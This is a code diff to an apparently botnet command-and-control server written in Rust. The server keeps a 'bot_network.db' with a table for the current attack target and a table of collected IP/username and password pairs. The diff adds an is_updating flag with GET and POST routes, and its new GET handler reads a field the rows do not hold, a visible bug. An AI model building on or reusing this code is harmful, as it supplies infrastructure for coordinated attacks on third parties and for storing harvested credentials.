@@ -38,6 +38,12 @@ fn create_tables(conn: &Connection) {
              password TEXT)",
         [],
     ).unwrap();
+    conn.execute(
+        "CREATE TABLE IF NOT EXISTS is_updating(
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            is_updating TEXT)",
+        []
+    ).unwrap();
 }
 fn main() {
     let mut router = Router::new();
@@ -100,7 +106,6 @@ fn main() {
             };
             let conn = Connection::open("bot_network.db").unwrap();
             create_tables(&conn);
-            // println!("Attacking {}", _received["address"].to_string());
             conn.execute("DELETE FROM attack_address", []).unwrap();
             conn.execute(
                 "INSERT INTO attack_address (address) VALUES (?1)",
@@ -167,10 +172,11 @@ fn main() {
     router.post(
         "/update_info",
             move|req: &mut Request| {
+                let conn = Connection::open("bot_network.db").unwrap();
                 let request = req.get::<bodyparser::Json>().unwrap().unwrap().to_string();
-                let mut splitted = request.split("\",").collect::<Vec<&str>>();
-                let mut ip_username = splitted[0].to_string();
-                let mut password = splitted[1].to_string();
+                let splitted = request.split("\",").collect::<Vec<&str>>();
+                let ip_username = splitted[0].to_string();
+                let password = splitted[1].to_string();
                 conn.execute(
                     "INSERT INTO update_info (ip_username, password) VALUES (?1, ?2)",
                     [ip_username, password]
@@ -183,8 +189,47 @@ fn main() {
     
     router.get(
         "/currently_updating",
-        move |_: &mut Request| Ok(Response::with((status::Ok, "true"))),
+        move |_: &mut Request| {
+            let conn = Connection::open("bot_network.db").unwrap();
+            create_tables(&conn);
+            let q = "SELECT * FROM is_updating";
+            let mut stmt = conn.prepare(q).unwrap();
+            let iter = stmt
+                .query_map([], |row| {
+                    Ok(serde_json::json!({
+                        "id" : row.get::<usize, i64>(0).unwrap().to_string(),
+                        "is_updating" : row.get::<usize, String>(1).unwrap().to_string()
+                    }))
+                })
+                .unwrap();
+            let mut value = String::new();
+            for elem in iter {
+                value = elem.unwrap()["address"].to_string();
+
+            }
+            Ok(Response::with((status::Ok, value)))
+        },
         "currently_updating",
+    );
+    router.post(
+        "/currently_updating",
+        move |req: &mut Request| {
+            let body = req.get::<bodyparser::Json>().unwrap();
+            let _received = match body {
+                None => serde_json::json!({"address": ""}),
+                Some(body) => serde_json::json!({ "updating": body }),
+            };
+            let conn = Connection::open("bot_network.db").unwrap();
+            create_tables(&conn);
+            conn.execute("DELETE FROM is_updating", []).unwrap();
+            conn.execute(
+                "INSERT INTO is_updating (is_updating) VALUES (?1)",
+                [_received["updating"].to_string()],
+            )
+                .unwrap();
+            Ok(Response::with((status::Ok, "ok")))
+        },
+        "change_updating",
     );
 
     router.get(
